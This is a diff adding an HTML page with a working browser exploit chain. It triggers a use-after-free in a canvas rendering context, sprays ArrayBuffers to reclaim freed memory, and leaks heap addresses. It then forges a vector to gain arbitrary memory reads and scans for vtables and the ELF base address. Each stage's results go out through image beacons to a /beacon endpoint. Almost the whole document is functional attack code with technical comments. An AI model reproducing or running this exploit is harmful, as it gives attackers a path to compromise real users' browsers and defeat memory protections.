@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V633</title></head>
+<body><pre id="out">V633 — dual-groom Portablelle v3</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<60;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){var img=_imgs[_ix++%60];img.src='/beacon/V633-'+tag+'?d='+encodeURIComponent(String(d).slice(0,600))+'&t='+Date.now();}
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+var _b8b=new ArrayBuffer(8),_bu64;
+try{_bu64=new BigUint64Array(_b8b);}catch(e){}
+var _f64b=new Float64Array(_b8b);
+function f2h(v){_f64[0]=v;return ('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);}
+function f2i(v){if(_bu64){_f64b[0]=v;return _bu64[0];}return null;}
+
+bk('BOOT','v633-portablelle-v3');
+
+/* DUAL GROOM: populate 768B and 4608B libpas pages heavily.
+ * After UAF, the freed context (768B) and state buffer (4608B) are on pages
+ * that still have live groom objects → pages stay committed → stale reads safe.
+ * Key: 768B pages hold ~21 objects each. 120 grooms fill ~6 pages,
+ * leaving room on the last page for the context allocation. */
+var g768=new Array(120);
+for(var g=0;g<120;g++) g768[g]=new ArrayBuffer(768);
+var g4608=new Array(60);
+for(var g=0;g<60;g++) g4608[g]=new ArrayBuffer(4608);
+bk('G0','768=120,4608=60');
+
+/* Pre-allocate spray array — no butterfly growth during spray */
+var SPRAY=100;
+var abs=new Array(SPRAY);
+for(var i=0;i<SPRAY;i++) abs[i]=0;
+
+/* UAF TRIGGER
+ * 8 saves → external state buffer (4608B class).
+ * lineWidth=MARKER realized → m_unrealizedSaveCount=0.
+ * NO setLineDash → lineDash stays empty (m_buffer=null, m_size=0).
+ * After getter: bitmaprenderer frees context(768B) + state buffer(4608B).
+ * Vector destructor does NOT reset m_size (stays 9) or m_buffer (dangling). */
+var canvas=document.createElement('canvas');
+canvas.width=1;canvas.height=1;
+var innerCtx=null;
+var uafOpts={};
+Object.defineProperty(uafOpts,'alpha',{get:function(){
+  innerCtx=canvas.getContext('2d');
+  for(var i=0;i<8;i++) innerCtx.save();
+  innerCtx.lineWidth=3.14159;
+  return true;
+}});
+
+canvas.getContext('bitmaprenderer',uafOpts);
+bk('B1','uaf='+(innerCtx?'ok':'null'));
+
+/* IMMEDIATELY spray AB(4608) — reclaim the freed state buffer.
+ * Zero-init AB: lineWidth@3248=0, lineDash.m_buffer@3368=0.
+ * The freed 768B context slot stays on a groomed page (stale m_stateStack intact).
+ * m_stateStack.m_buffer (dangling) now points to the AB backing store. */
+for(var i=0;i<SPRAY;i++) abs[i]=new ArrayBuffer(4608);
+bk('S1','spray='+SPRAY);
+
+/* POST-SPRAY lineWidth: reads through freed 768B context → m_stateStack →
+ * follows m_buffer (dangling) into AB → reads zero at offset 3248 */
+var postLW=-999,postE='';
+try{postLW=innerCtx.lineWidth;}catch(e){postE=e.name;}
+bk('S2','post='+(postE||f2h(postLW)));
+
+/* WRITE lineWidth=1.717 → writes to AB byte 3248 → scan to find target AB */
+var writeOK=0;
+try{innerCtx.lineWidth=1.717;writeOK=1;}catch(e){}
+bk('S3','write='+writeOK);
+
+var LW_OFF=8*400+48;
+var hit=-1,hitOff=-1;
+if(writeOK){
+  var expIdx=LW_OFF/8;
+  for(var j=0;j<SPRAY;j++){
+    var fv=new Float64Array(abs[j]);
+    if(fv[expIdx]===1.717){hit=j;hitOff=expIdx*8;break;}
+    for(var k=Math.max(0,expIdx-10);k<Math.min(fv.length,expIdx+10);k++){
+      if(fv[k]===1.717){hit=j;hitOff=k*8;break;}
+    }
+    if(hit>=0)break;
+  }
+}
+bk('S4','hit='+hit+',off='+hitOff);
+say('Hit: AB['+hit+'] off='+hitOff);
+
+/* HEAP LEAK: setLineDash([1,2,3,4]) on the stale State.
+ * State[8].lineDash is in AB at offset 3368.
+ * AB zero-init → m_buffer=0, m_size=0, m_capacity=0.
+ * Vector copy-assignment: size 4 > capacity 0 → clear (fastFree(NULL)=noop)
+ * → reserveCapacity(4) → malloc(32) → NEW buffer address written to AB[3368].
+ * Then copies [1.0, 2.0, 3.0, 4.0] into new buffer.
+ * We read the new buffer address via DataView! */
+var LD_OFF=8*400+168;
+var heapLeak=0n,leakOK=0;
+if(hit>=0){
+  var dv=new DataView(abs[hit]);
+  try{
+    innerCtx.setLineDash([1.0,2.0,3.0,4.0]);
+    heapLeak=dv.getBigUint64(LD_OFF,true);
+    leakOK=1;
+  }catch(e){leakOK=-1;}
+}
+if(leakOK===1 && heapLeak>0n){
+  bk('LEAK','***0x'+heapLeak.toString(16)+'***');
+  say('*** HEAP LEAK: 0x'+heapLeak.toString(16)+' ***');
+}else{
+  bk('NOLEAK','s='+leakOK+',h='+heapLeak);
+}
+
+/* ARB READ: forge lineDash Vector to verify. Point m_buffer at leaked addr,
+ * set m_size=4, m_capacity=4. getLineDash should return [1,2,3,4]. */
+var arbOK=0;
+if(leakOK===1 && heapLeak>0n){
+  var dv2=new DataView(abs[hit]);
+  try{
+    dv2.setBigUint64(LD_OFF,heapLeak,true);
+    dv2.setUint32(LD_OFF+8,4,true);
+    dv2.setUint32(LD_OFF+12,4,true);
+    var rd=innerCtx.getLineDash();
+    arbOK=(rd.length>=4)?1:0;
+    var match=(rd[0]===1.0&&rd[1]===2.0&&rd[2]===3.0&&rd[3]===4.0);
+    bk('ARB','len='+rd.length+',match='+match+',v0='+rd[0]);
+    say('ARB READ: len='+rd.length+' match='+match);
+    say('  ['+rd[0]+', '+rd[1]+', '+rd[2]+', '+rd[3]+']');
+  }catch(e){arbOK=-1;bk('ARB-E',e.name);}
+}
+
+/* HEAP SCAN: read 32KB backward from leaked addr for aligned pointers */
+var scanHits=[];
+if(arbOK>0 && heapLeak>0n){
+  var dv3=new DataView(abs[hit]);
+  var scanBase=heapLeak-32768n;
+  try{
+    dv3.setBigUint64(LD_OFF,scanBase,true);
+    dv3.setUint32(LD_OFF+8,8192,true);
+    dv3.setUint32(LD_OFF+12,8192,true);
+    var scan=innerCtx.getLineDash();
+    for(var si=0;si<scan.length;si++){
+      var v=f2i(scan[si]);
+      if(v!==null && v>0x10000n && v<0x800000000000n && (v&0x7n)===0n){
+        scanHits.push({off:si*8,addr:v});
+        if(scanHits.length>=20)break;
+      }
+    }
+  }catch(e){scanHits.push({off:-1,addr:0n,err:e.name});}
+  var sh=scanHits.length>0?'0x'+scanHits[0].addr.toString(16):'none';
+  bk('SCAN','n='+scanHits.length+',f='+sh);
+  if(scanHits.length>1){
+    var s2=scanHits.slice(1,6).map(function(h){return '0x'+h.addr.toString(16);});
+    bk('SC2',s2.join(','));
+  }
+  say('Scan: '+scanHits.length+' ptrs'+(scanHits.length>0?' first='+sh:''));
+}
+
+/* VTABLE HUNT: dereference first aligned pointer, look for code ptr */
+if(scanHits.length>0 && arbOK>0){
+  var dv4=new DataView(abs[hit]);
+  for(var ci=0;ci<Math.min(10,scanHits.length);ci++){
+    var candidate=scanHits[ci].addr;
+    try{
+      dv4.setBigUint64(LD_OFF,candidate,true);
+      dv4.setUint32(LD_OFF+8,8,true);
+      dv4.setUint32(LD_OFF+12,8,true);
+      var vr=innerCtx.getLineDash();
+      if(vr.length>=1){
+        var first=f2i(vr[0]);
+        if(first!==null && first>0x100000n && first<0x800000000000n){
+          bk('VT','at=0x'+candidate.toString(16)+',vt=0x'+first.toString(16));
+          say('VT: 0x'+first.toString(16)+' @ 0x'+candidate.toString(16));
+          for(var align=20n;align<=24n;align++){
+            var base=first&~((1n<<align)-1n);
+            dv4.setBigUint64(LD_OFF,base,true);
+            dv4.setUint32(LD_OFF+8,1,true);
+            dv4.setUint32(LD_OFF+12,1,true);
+            var eb=innerCtx.getLineDash();
+            if(eb.length>=1){
+              var mag=f2i(eb[0]);
+              if(mag!==null&&(mag&0xFFFFFFFFn)===0x464C457Fn){
+                bk('BASE','***0x'+base.toString(16)+'***');
+                say('*** ELF BASE: 0x'+base.toString(16)+' ***');
+                break;
+              }
+            }
+          }
+          break;
+        }
+      }
+    }catch(e){}
+  }
+}
+
+canvas._g768=g768;canvas._g4608=g4608;canvas._abs=abs;
+bk('DONE','v633');
+say('\nDONE');
+</script>
+</body></html>
